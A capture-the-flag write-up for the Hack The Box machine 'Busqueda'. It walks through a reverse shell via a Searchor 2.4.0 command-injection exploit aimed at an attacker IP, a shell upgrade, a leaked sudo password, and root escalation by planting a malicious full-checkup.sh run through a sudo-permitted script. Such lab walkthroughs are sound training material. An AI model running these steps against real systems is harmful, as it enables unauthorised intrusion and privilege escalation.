## Synopsis

Busqueda is an easy engine from hackthebox. In carrying out the enumeration process from the target, we can identify the version of the application, namely searchor 2.4.0, where in that version there is an Arbitrary Code Execution vulnerability. to get root privileges, we need to be able to get the user from svc in the .git/config directory. the next step is to execute sudo using system-checkup.py with malicious file-checkup.sh

## HTTP

Landing page from target

and you will notice the version of application it self.

The version is affected of **Arbitrary Code Execution** vulnerabillity, you can grab the exploit script in [here](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection). Execute command below and start the listener will lead you into system:

```
./exploit.sh http://searcher.htb/ 10.10.14.146
```

we logged in as `svc` user and we can upgrade shell with following command:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

you can find the password for svc user in directory .git/config

## Privilege Escalation

Run `sudo -l` will determining how to reach root user in this box

```
bash-5.1$ sudo -l
sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

```bash
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```
so if you check the directory /opt/scripts, you will notice if there is bash script with name full-checkup.sh.

we can make our malicious full-checkup.sh script too with contains `cat /root/root.txt`, but before doing that we can user dir /dev/shm to do that.

```bash
#!/bin/bash

ping -c 3 10.10.14.146

cat /root/root.txt
```

execute command below and catch with tcpdump on interface tun0

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

as you can see we able to ping our host and get the root.txt , i thought its gonna be do some export PATH but its not necessary.
